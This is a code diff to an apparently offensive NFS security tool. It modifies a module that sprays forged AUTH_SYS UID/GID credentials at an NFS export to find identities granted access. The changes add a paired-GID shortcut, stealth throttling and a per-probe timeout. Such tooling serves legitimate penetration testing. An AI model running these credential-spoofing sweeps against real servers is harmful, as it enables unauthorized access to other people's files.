@@ -7,12 +7,12 @@
 use std::sync::Arc;
 use std::time::Duration;
 
-use nfs3_types::nfs3::ACCESS3args;
+use nfswolf_nfs3::wire::ACCESS3args;
 use tracing::{debug, warn};
 
 use crate::proto::circuit::CircuitBreaker;
-use crate::proto::nfs3::client::Nfs3Client;
 use crate::proto::nfs3::types::FileHandle;
+use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
 use crate::util::stealth::StealthConfig;
 
 /// NFS ACCESS procedure bits (RFC 1813 S3.3.4)  --  re-exported from the
@@ -83,8 +83,14 @@ impl SprayResult {
 pub(crate) struct SprayConfig {
     /// Inclusive UID range to iterate.
     pub uid_range: std::ops::RangeInclusive<u32>,
-    /// Inclusive GID range to iterate.
+    /// Inclusive GID range to iterate, when sweeping the cross product.
     pub gid_range: std::ops::RangeInclusive<u32>,
+    /// Try each UID with the matching GID instead of the full cross product.
+    ///
+    /// The Linux per-user-group convention makes this the useful default: uid
+    /// 1000 almost always has gid 1000, so pairing finds the same access in
+    /// `n` probes that the cross product needs `n * 65536` to find.
+    pub paired_gid: bool,
     /// Auxiliary GIDs to permute per UID attempt (injected into AUTH_SYS).
     pub auxiliary_gids: Vec<u32>,
     /// Remote path string (informational, used in log output).
@@ -104,6 +110,12 @@ pub(crate) struct SprayConfig {
 ///
 /// Implements F-1.1 (UID/GID Spoofing) from FINDINGS.md. Each attempt is a fresh
 /// AUTH_SYS credential with a new stamp (RFC 1057 S9.2) to avoid caching.
+/// Deadline for one ACCESS probe during a sweep.
+///
+/// Matches the pooled transport's own RPC timeout; the sweep bypasses that
+/// transport to keep one connection, so it carries the same discipline itself.
+const SPRAY_RPC_TIMEOUT: Duration = Duration::from_secs(30);
+
 pub(crate) struct UidSprayer {
     nfs3: Nfs3Client,
     circuit: Arc<CircuitBreaker>,
@@ -140,7 +152,7 @@ impl UidSprayer {
 
         // Check out a single connection for the entire spray.  All credential
         // changes are applied inline; no additional MOUNT calls are made.
-        let mut conn = match self.nfs3.checkout_one().await {
+        let mut conn = match self.nfs3.transport().checkout().await {
             Ok(c) => c,
             Err(e) => {
                 warn!(err = %e, "spray: failed to check out connection");
@@ -149,7 +161,8 @@ impl UidSprayer {
         };
 
         'outer: for uid in config.uid_range.clone() {
-            for gid in config.gid_range.clone() {
+            let gids: Vec<u32> = if config.paired_gid { vec![uid] } else { config.gid_range.clone().collect() };
+            for gid in gids {
                 // Check circuit breaker before every attempt.
                 if let Err(e) = self.check_circuit() {
                     warn!(?e, "circuit breaker open, stopping spray");
@@ -161,21 +174,35 @@ impl UidSprayer {
                 }
                 self.stealth.wait().await;
 
-                let mut aux = config.auxiliary_gids.clone();
-                if !aux.contains(&gid) {
-                    aux.insert(0, gid);
-                }
-
-                match conn.access_as(&args, uid, gid, &aux, "nfswolf").await {
+                // The sweep deliberately holds one connection so it does not
+                // re-MOUNT per candidate, which means it sits outside
+                // PooledTransport and must apply its own deadline: a server
+                // that accepts the TCP connection and then stops answering
+                // would otherwise wedge the loop forever on a single await,
+                // holding the pool's admission permit with it.
+                let call = conn.call_as::<_, nfswolf_nfs3::wire::ACCESS3res>(
+                    crate::proto::auth::AuthSys::with_groups(uid, gid, &config.auxiliary_gids, "nfswolf").to_opaque_auth(crate::proto::auth::next_stamp()),
+                    nfswolf_nfs3::PROGRAM,
+                    nfswolf_nfs3::VERSION,
+                    nfswolf_nfs3::wire::NFS_PROGRAM::NFSPROC3_ACCESS as u32,
+                    &args,
+                );
+                let Ok(outcome) = tokio::time::timeout(SPRAY_RPC_TIMEOUT, call).await else {
+                    warn!(uid, gid, "spray: RPC timed out; abandoning the sweep");
+                    conn.poison();
+                    self.circuit.record_failure(self.nfs3.host());
+                    break;
+                };
+                match outcome {
                     Ok(res) => match res {
-                        nfs3_types::nfs3::Nfs3Result::Ok(ok) => {
+                        nfswolf_nfs3::wire::Nfs3Result::Ok(ok) => {
                             let granted = ok.access;
                             debug!(uid, gid, access = granted, "spray: access granted");
                             if granted & config.required_access != 0 {
                                 results.push(SprayResult { uid, gid, access: granted });
                             }
                         },
-                        nfs3_types::nfs3::Nfs3Result::Err((stat, _)) => {
+                        nfswolf_nfs3::wire::Nfs3Result::Err((stat, _)) => {
                             debug!(uid, gid, ?stat, "spray: access denied");
                         },
                     },
